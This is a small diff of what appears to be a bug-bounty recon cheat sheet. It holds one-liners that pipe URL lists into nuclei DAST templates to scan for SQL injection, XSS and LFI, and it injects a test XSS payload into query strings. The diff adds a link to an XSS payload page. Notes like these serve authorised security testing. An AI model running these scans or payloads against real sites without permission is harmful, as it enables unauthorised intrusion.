@@ -192,3 +192,6 @@ cat allurls.txt | gau | urldedupe -s | gf sqli | nuclei -t /root/nuclei-template
 cat allurls.txt | waybackurls | urldedupe -s qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
 
 #cat domain.txt | gau | urldedupe -s | gf lfi | nuclei -t /root/nuclei-templates/dast/vulnerabilities/lfi -dast | anew nov.txt
+
+xss
+https://xsshunter.trufflesecurity.com/app/#/xsspayloads
